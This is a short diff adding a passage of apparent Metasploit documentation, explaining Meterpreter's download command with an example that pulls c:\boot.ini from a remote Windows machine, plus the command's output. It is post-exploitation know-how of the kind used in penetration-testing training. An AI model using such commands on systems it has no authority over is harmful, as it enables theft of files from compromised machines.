@@ -1,0 +1,8 @@
+The download command downloads a file from the remote machine. Note the use of the double-slashes when giving the Windows path.
+
+meterpreter > download c:\\boot.ini
+
+[*] downloading: c:\boot.ini -> c:\boot.ini
+[*] downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
+
+meterpreter >
